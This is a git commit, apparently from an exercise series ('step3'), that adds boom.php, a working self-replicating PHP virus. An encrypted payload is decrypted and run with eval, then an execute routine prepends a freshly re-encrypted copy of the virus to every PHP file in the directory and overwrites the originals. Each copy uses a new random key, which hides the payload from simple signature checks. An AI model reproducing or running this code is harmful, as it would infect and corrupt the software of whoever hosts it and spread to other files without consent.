bdb1f83e97ab393668549b0544a71c5977f6a2fc
Phil Sushko <dasd_90@hotmail.com>
2018-08-16 16:08:16 +0300

    add result for step3

---
+++ step3/result/boom.php
@@ -0,0 +1,87 @@
+<?php
+$encryptedVirus = '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';
+$iv = '7yjIchCYjh0P5xg1Iwzo/Q==';
+$key = 'qisicXFh8q6ybbcp4I31GjKjI27to2cID6YCUuFiG8U=';
+$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode($key), base64_decode($encryptedVirus), MCRYPT_MODE_CBC, base64_decode($iv));
+eval($virus);
+execute($virus);
+?><?php
+// VIRUS:START
+function execute($virus)
+{
+    $infection = '<?php ' . encryptedVirus($virus) . ' ?>'; // VIRUS
+    $fileNames = glob('*.php'); // Get a list of all php files
+
+    foreach ($fileNames as $fileName) { // Check each file
+
+        $script = fopen($fileName, 'r'); // Open file
+        $infected = fopen($fileName . '.infected', 'w'); // Let's write to a new file
+        fputs($infected, $infection, strlen($infection));
+
+        while ($contents = fgets($script)) {
+            fputs($infected, $contents, strlen($contents));
+        }
+
+        fclose($script);//Close both handles
+        fclose($infected);
+
+        rename($fileName, $fileName . '.original'); //Move the infected file in to place
+        rename($fileName . '.infected', $fileName);
+
+        unlink($fileName . '.original');
+    }
+}
+
+function encryptedVirus($virus)
+{
+    $str = '0123456789abcdef'; // Gen key
+    $key = '';
+
+    for ($i = 0; $i < 64; $i++) {
+        $key .= $str[rand(0, strlen($str) - 1)];
+    }
+    $key = pack('H*', $key);
+
+    // Encrypt
+    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+    $encryptedVirus = mcrypt_encrypt(
+        MCRYPT_RIJNDAEL_128,
+        $key,
+        $virus,
+        MCRYPT_MODE_CBC,
+        $iv
+    );
+
+    // Encode
+    $encodedVirus = base64_encode($encryptedVirus);
+    $encodedIV = base64_encode($iv);
+    $encodedKey = base64_encode($key);
+
+    // Payload
+    $payload = "
+        \$encryptedVirus = '$encodedVirus';
+        \$iv = '$encodedIV';
+        \$key = '$encodedKey';
+        \$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode(\$key), base64_decode(\$encryptedVirus), MCRYPT_MODE_CBC, base64_decode(\$iv));
+        eval(\$virus);
+        execute(\$virus);
+    ";
+
+    return $payload;
+}
+
+// VIRUS:END
+
+$virus = file_get_contents(__FILE__);
+$virus = substr(
+    $virus,
+    strpos($virus, '// VIRUS:START')
+);
+$virus = substr(
+    $virus,
+    0,
+    strpos($virus, PHP_EOL . '// VIRUS:END') + strlen(PHP_EOL . '// VIRUS:END')
+);
+execute($virus);
+
